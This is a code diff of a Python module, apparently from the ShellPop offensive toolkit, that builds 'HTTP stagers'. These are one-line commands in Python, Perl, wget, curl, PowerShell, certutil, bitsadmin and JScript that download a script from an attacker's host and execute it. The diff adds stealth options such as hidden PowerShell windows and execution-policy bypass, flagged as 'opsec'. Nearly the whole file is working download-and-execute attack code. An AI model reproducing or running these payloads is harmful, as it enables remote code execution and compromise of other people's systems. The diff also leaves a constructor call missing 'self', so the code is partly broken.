@@ -5,6 +5,7 @@ from SimpleHTTPServer import SimpleHTTPRequestHandler
 from SocketServer import TCPServer
 from socket import *
 
+
 class HTTPServer(object):
     def __init__(self, port):
         self.port = port
@@ -14,7 +15,7 @@ class HTTPServer(object):
         We probe this port, to check if it is available.
         """
         sock = socket(AF_INET, SOCK_STREAM)
-        sock.settimeout(3.0) # maximum delay
+        sock.settimeout(3.0)  # maximum delay
         try:
             sock.connect(('', self.port))
             sock.close()
@@ -35,6 +36,7 @@ class HTTPStager(object):
         self.name = None
         self.payload = None
         self.args = None
+        self.opsec = False  # Set to true if it is stealth (hides windows or processes)
 
     def get(self):
         """
@@ -54,74 +56,110 @@ class HTTPStager(object):
 # It must refer to HTTP port and not a shell handler port.
 class Python_HTTP_Stager(HTTPStager):
     name = "Python HTTP Stager"
+
     def __init__(self, conn_info, args, filename):
+        HTTPStager.__init__()
         self.args = args
         self.host = conn_info[0]
         self.port = conn_info[1]
-        self.payload = """python -c "from requests import get;import os;os.system(get('http://{0}:{1}/{2}').text)" """.format(self.host,
-                self.port, filename)
-    
+        self.payload = """python -c "from requests import get;import os;os.system(get('http://{0}:{1}/{2}').text)" """.format(self.host, self.port, filename)
+
+
 class Perl_HTTP_Stager(HTTPStager):
     name = "Perl HTTP Stager"
+
     def __init__(self, conn_info, args, filename):
+        HTTPStager.__init__(self)
         self.args = args    
         self.host = conn_info[0]
         self.port = conn_info[1]
         self.payload = """perl -e 'use LWP::UserAgent;my $u=new LWP::UserAgent;my $d="http://{0}:{1}/{2}";my $req=new HTTP::Request("GET", $d);my $res=$u->request($req);my $c=$res->content();system $c' """.format(self.host,
-                self.port, filename)
+                                                                                                       self.port,
+                                                                                                       filename)
+
 
 class Wget_HTTP_Stager(HTTPStager):
     name = "Wget HTTP stager"
+
     def __init__(self, conn_info, args, filename):
+        HTTPStager.__init__(self)
         self.args = args    
         self.host = conn_info[0]
         self.port = conn_info[1]
         self.payload = """wget http://{0}:{1}/{2} -O - |bash -p""".format(self.host,
                 self.port, filename)
 
+
 class Curl_HTTP_Stager(HTTPStager):
     name = "cURL HTTP stager"
+
     def __init__(self, conn_info, args, filename):
+        HTTPStager.__init__(self)
         self.args = args    
         self.host = conn_info[0]
         self.port = conn_info[1]
         self.payload = """curl http://{0}:{1}/{2} |bash -p""".format(self.host,
                 self.port, filename)
 
+
 class Powershell_HTTP_Stager(HTTPStager):
-    name = "Powershell HTTP Stager"
+    name = "Powershell cmd.exe HTTP Stager"
+
     def __init__(self, conn_info, args, filename):
+        HTTPStager.__init__(self)
         self.args = args    
         self.host = conn_info[0]
         self.port = conn_info[1]
-        self.payload = """powershell.exe -nop -ep bypass -Command $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy();$x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $x.downloadString('http://{0}:{1}/{2}') """.format(self.host,
-                self.port, filename)
+        self.opsec = True
+        self.payload = """powershell.exe -nop -w hidden -ep bypass -Command $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy();$x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$p=$x.downloadString('http://{0}:{1}/{2}');cmd.exe /c $p """.format(self.host, self.port, filename)
+
+
+class PurePowershell_HTTP_Stager(HTTPStager):
+    name = "Pure Powershell HTTP Stager"
+
+    def __init__(self, conn_info, args, filename):
+        HTTPStager.__init__(self)
+        self.args = args
+        self.host = conn_info[0]
+        self.port = conn_info[1]
+        self.opsec = True
+        self.payload = """powershell.exe -nop -w hidden -ep bypass -Command $x=new-object net.webclient;$x.proxy=[Net.WebRequest]::GetSystemWebProxy();$x.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iEx $x.downloadString('http://{0}:{1}/{2}') """.format(self.host, self.port, filename)
+
 
 class Certutil_HTTP_Stager(HTTPStager):
     name = "CertUtil Windows HTTP Stager"
+
     def __init__(self, conn_info, args, filename):
+        HTTPStager.__init__(self)
         self.args = args    
         self.host = conn_info[0]
         self.port = conn_info[1]
-        self.payload = """cmd.exe /c "certutil -urlcache -split -f http://{0}:{1}/{2} {2}.bat && cmd.exe /c {2}.bat" """.format(self.host,
-                self.port, filename)
+        self.payload = """start /wait /b cmd.exe /c "certutil -urlcache -split -f http://{0}:{1}/{2} {2}.bat && start /b cmd.exe /c {2}.bat" """.format(self.host, self.port, filename)
+
 
 class BitsAdmin_HTTP_Stager(HTTPStager):
     name = "BitsAdmin Windows HTTP Stager"
-    def __init__(self, conn_info, args, filename):
-        self.args = args
-        self.host = conn_info[0]
-        self.port = conn_info[1]
-        self.payload = """cmd.exe /c "bitsadmin.exe /transfer {0} /download /priority normal http://{1}:{2}/{3} %Temp%\\{3}.bat && cmd.exe /c %Temp%\\{3}.bat" """.format(generate_file_name(), self.host,
-            self.port, filename)
 
-class VBScript_HTTP_Stager(HTTPStager):
-    name = "VBScript Windows HTTP Stager"
     def __init__(self, conn_info, args, filename):
+        HTTPStager.__init__(self)
         self.args = args
         self.host = conn_info[0]
         self.port = conn_info[1]
-        self.payload = """cmd.exe /c "echo var H = new ActiveXObject("WinHttp.WinHttpRequest.5.1");H.Open("GET", "http://{0}:{1}/{2}", /*async=*/false);H.Send();B = new ActiveXObject("ADODB.Stream");B.Type = 1;B.Open();B.Write(H.ResponseBody);B.SaveToFile("{2}.bat");S = new ActiveXObject("Wscript.Shell");S.run("{2}.bat");" > {2}.js && cmd.exe /c "cscript {2}.js" """.format(self.host, self.port, filename)
+        self.payload = """start /wait /b cmd.exe /c "bitsadmin.exe /transfer {0} /download /priority normal http://{1}:{2}/{3} %Temp%\\{3}.bat && start /b cmd.exe /c %Temp%\\{3}.bat" """.format(generate_file_name(),
+                                                                                              self.host, self.port,
+                                                                                              filename)
+
+
+class VbScriptHttpStager(HTTPStager):
+    name = "VBScript Windows HTTP Stager"
+
+    def __init__(self, conn_info, args, filename):
+        HTTPStager.__init__(self)
+        self.args = args
+        self.host = conn_info[0]
+        self.port = conn_info[1]
+        self.payload = """start /wait /b cmd.exe /c "echo var H = new ActiveXObject("WinHttp.WinHttpRequest.5.1");H.Open("GET", "http://{0}:{1}/{2}", /*async=*/false);H.Send();B = new ActiveXObject("ADODB.Stream");B.Type = 1;B.Open();B.Write(H.ResponseBody);B.SaveToFile("{2}.bat");S = new ActiveXObject("Wscript.Shell");S.run("{2}.bat");" > {2}.js && start /b cmd.exe /c "cscript {2}.js" """.format(self.host, self.port, filename)
+
 
 def choose_stager(stagers):
     """
@@ -152,10 +190,12 @@ def choose_stager(stagers):
     print("\n")
     # Loop through each of them.
     for stager in stagers:
-        if stager[0] == n: # if (n-1) is the chosen number.
-            return stager[1] # return HTTPStager object.
+        if stager[0] == n:  # if (n-1) is the chosen number.
+            return stager[1]  # return HTTPStager object.
 
 # These are going to be passed as available stagers in bin/shellpop
+
+
 LINUX_STAGERS = [
     (1, Python_HTTP_Stager),
     (2, Perl_HTTP_Stager),
@@ -167,5 +207,5 @@ WINDOWS_STAGERS = [
     (1, Powershell_HTTP_Stager),
     (2, Certutil_HTTP_Stager),
     (3, BitsAdmin_HTTP_Stager),
-    (4, VBScript_HTTP_Stager)
+    (4, VbScriptHttpStager)
 ]
